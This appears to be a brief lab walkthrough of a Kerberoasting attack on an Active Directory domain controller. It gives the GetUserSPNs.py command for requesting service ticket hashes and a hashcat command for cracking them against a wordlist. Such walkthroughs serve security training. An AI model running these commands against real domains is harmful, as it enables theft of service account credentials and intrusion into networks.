# V. Kerberoasting Walkthrough

All we need for this attack is our Kali machine and DC machine as it is our KDC (Key Distribution Centre).

Open the terminal and use the following command to grab the hash `python GetUserSPNs.py <DOMAIN/username:password> -dc-ip <ip of DC> -request` :

![Kerberoasting 1.png](V%20Kerberoasting%20Walkthrough%203672962b2cda4bc3a5e1c4e8100f75bf/Kerberoasting_1.png)

Next save the hash into a text file (i.e krb.txt)

Finally crack the hash using hashcat.

`hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt`